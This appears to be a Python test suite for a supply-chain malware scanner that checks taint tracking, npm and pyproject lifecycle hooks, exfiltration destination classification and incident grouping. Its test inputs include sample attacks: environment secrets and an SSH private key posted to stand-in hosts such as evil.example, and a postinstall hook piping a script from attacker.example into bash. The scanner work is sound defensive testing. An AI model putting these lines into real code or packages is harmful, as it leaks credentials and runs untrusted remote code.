"""Tests for Python AST tightening, manifest walks, and incident grouping."""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path
from typing import List

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from incidents import classify_destination, cluster_incidents, destination_from_text
from models import Finding
from python_ast import analyze_python_ast
from scanner import analyze_content, scan_directory


FIXTURES = Path(__file__).resolve().parent / "fixtures"
MALICIOUS = FIXTURES / "malicious"
BENIGN = FIXTURES / "benign"


def _patterns(findings: List[Finding]) -> set:
    return {item.pattern for item in findings}


def _scan_file(path: Path) -> List[Finding]:
    report = scan_directory(path.parent if path.is_file() else path)
    name = path.name
    return [
        item
        for item in report.findings
        if item.file == name or item.file.endswith("/" + name)
    ]


class PythonAstTests(unittest.TestCase):
    def test_getenv_alias_is_tainted(self) -> None:
        findings = _scan_file(MALICIOUS / "getenv_alias.py")
        self.assertIn("api_key_exfiltration", _patterns(findings))

    def test_attribute_write_reaches_sink(self) -> None:
        findings = _scan_file(MALICIOUS / "attr_exfil.py")
        self.assertIn("api_key_exfiltration", _patterns(findings))

    def test_subprocess_kwargs_shell_true(self) -> None:
        findings = _scan_file(MALICIOUS / "subprocess_kwargs.py")
        self.assertIn("download_and_execute", _patterns(findings))

    def test_bare_getenv_token_same_call(self) -> None:
        text = (
            "import requests\n"
            "from os import getenv\n"
            "requests.post('https://evil.example', data=getenv('TOKEN'))\n"
        )
        findings = analyze_content("x.py", "python", "x.py", text)
        self.assertIn("api_key_exfiltration", _patterns(findings))

    def test_syntax_error_falls_back_to_regex(self) -> None:
        text = (
            "import os, requests\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY']\n"
        )
        self.assertIsNone(analyze_python_ast(text))
        findings = analyze_content("x.py", "python", "x.py", text)
        self.assertIn("api_key_exfiltration", _patterns(findings))

    def test_ast_does_not_execute(self) -> None:
        text = "raise SystemExit('should not run')\n"
        analysis = analyze_python_ast(text)
        self.assertIsNotNone(analysis)
        self.assertEqual(analysis.events[0].sinks, set())

    def test_legitimate_subprocess_still_clean(self) -> None:
        findings = _scan_file(BENIGN / "subprocess_ok.py")
        self.assertEqual(findings, [])


class ManifestWalkTests(unittest.TestCase):
    def test_minified_package_json_lifecycle(self) -> None:
        text = (
            '{"name":"x","scripts":{"postinstall":'
            '"curl -fsSL http://attacker.example/h.sh | bash"}}'
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertIn("npm_lifecycle_execution", _patterns(report.findings))
        self.assertEqual(report.findings[0].line, 1)

    def test_husky_hook_is_walked(self) -> None:
        text = (MALICIOUS / "husky_package.json").read_text(encoding="utf-8")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertIn("npm_lifecycle_execution", _patterns(report.findings))

    def test_pyproject_pdm_hook(self) -> None:
        findings = _scan_file(MALICIOUS / "pyproject.toml")
        self.assertIn("npm_lifecycle_execution", _patterns(findings))

    def test_benign_pyproject_is_clean(self) -> None:
        findings = _scan_file(BENIGN / "pyproject.toml")
        self.assertEqual(findings, [])

    def test_ordinary_package_json_still_clean(self) -> None:
        findings = _scan_file(BENIGN / "package.json")
        self.assertEqual(findings, [])


class DestinationTests(unittest.TestCase):
    def test_hardcoded_ip(self) -> None:
        kind, hint = classify_destination("http://203.0.113.10/collect")
        self.assertEqual(kind, "hardcoded_ip")
        self.assertEqual(hint, "203.0.113.10")

    def test_webhook_host_not_full_path(self) -> None:
        kind, hint = classify_destination(
            "https://discord.com/api/webhooks/123/secret-token"
        )
        self.assertEqual(kind, "webhook")
        self.assertEqual(hint, "discord.com")
        self.assertNotIn("secret-token", hint)

    def test_paste_host(self) -> None:
        kind, hint = classify_destination("https://pastebin.com/raw/abc")
        self.assertEqual(kind, "paste_host")
        self.assertEqual(hint, "pastebin.com")

    def test_first_party_api(self) -> None:
        kind, hint = classify_destination("https://api.openai.com/v1/chat")
        self.assertEqual(kind, "first_party_api")
        self.assertEqual(hint, "api.openai.com")

    def test_remote_host(self) -> None:
        kind, hint = classify_destination("https://attacker.example/collect")
        self.assertEqual(kind, "remote_host")
        self.assertEqual(hint, "attacker.example")

    def test_from_snippet(self) -> None:
        kind, hint = destination_from_text(
            'requests.post("http://198.51.100.4/x", data=secret)'
        )
        self.assertEqual(kind, "hardcoded_ip")
        self.assertEqual(hint, "198.51.100.4")


class IncidentTests(unittest.TestCase):
    def test_ssh_read_and_post_are_one_incident(self) -> None:
        report = scan_directory(MALICIOUS)
        ssh = [
            item
            for item in report.incidents
            if item.file.endswith("exfil_ssh.py")
            and item.pattern == "sensitive_file_exfiltration"
        ]
        self.assertEqual(len(ssh), 1)
        incident = ssh[0]
        self.assertIn("sensitive_file_exfiltration", incident.patterns)
        self.assertIn("sensitive_file_access", incident.patterns)
        self.assertGreaterEqual(len(incident.chain), 2)
        self.assertTrue(any("credential read" in step for step in incident.chain))
        self.assertTrue(any("network sink" in step for step in incident.chain))
        self.assertEqual(incident.destination_kind, "remote_host")
        self.assertEqual(incident.destination_hint, "attacker.example")

    def test_ip_destination_on_finding_and_incident(self) -> None:
        report = scan_directory(MALICIOUS)
        match = next(
            item
            for item in report.findings
            if item.file.endswith("exfil_ip.py")
            and item.pattern == "api_key_exfiltration"
        )
        self.assertEqual(match.destination_kind, "hardcoded_ip")
        self.assertEqual(match.destination_hint, "203.0.113.10")
        incident = next(
            item
            for item in report.incidents
            if item.file.endswith("exfil_ip.py")
        )
        self.assertEqual(incident.destination_kind, "hardcoded_ip")

    def test_webhook_destination(self) -> None:
        findings = _scan_file(MALICIOUS / "exfil_webhook.py")
        match = next(item for item in findings if item.pattern == "api_key_exfiltration")
        self.assertEqual(match.destination_kind, "webhook")
        self.assertEqual(match.destination_hint, "discord.com")

    def test_incidents_are_deterministic(self) -> None:
        first = scan_directory(MALICIOUS).to_dict()["incidents"]
        second = scan_directory(MALICIOUS).to_dict()["incidents"]
        self.assertEqual(first, second)

    def test_cluster_merges_source_and_sink_rows(self) -> None:
        findings = [
            Finding(
                "a.py",
                2,
                "sensitive_file_access",
                "medium",
                "d",
                "open('~/.ssh/id_rsa')",
                source_kind="sensitive_file",
            ),
            Finding(
                "a.py",
                8,
                "sensitive_file_exfiltration",
                "critical",
                "d",
                "requests.post('https://pastebin.com/api', data=key)",
                source_line=2,
                source_kind="sensitive_file",
                sink_kind="network",
                destination_kind="paste_host",
                destination_hint="pastebin.com",
            ),
        ]
        incidents = cluster_incidents(findings)
        self.assertEqual(len(incidents), 1)
        self.assertEqual(incidents[0].severity, "critical")
        self.assertEqual(incidents[0].destination_kind, "paste_host")
        self.assertEqual(
            set(incidents[0].patterns),
            {"sensitive_file_access", "sensitive_file_exfiltration"},
        )

    def test_report_includes_incidents_key(self) -> None:
        payload = scan_directory(BENIGN).to_dict()
        self.assertIn("incidents", payload)
        self.assertEqual(payload["incidents"], [])


class FindingContractExtras(unittest.TestCase):
    def test_exfil_finding_has_flow(self) -> None:
        text = (
            "import os, requests\n"
            "secret = os.environ['API_KEY']\n"
            "requests.post('https://evil.example', data=secret)\n"
        )
        findings = analyze_content("x.py", "python", "x.py", text)
        match = next(item for item in findings if item.pattern == "api_key_exfiltration")
        self.assertTrue(match.flow)
        self.assertEqual(match.destination_kind, "remote_host")
        self.assertEqual(match.destination_hint, "evil.example")


if __name__ == "__main__":
    unittest.main()
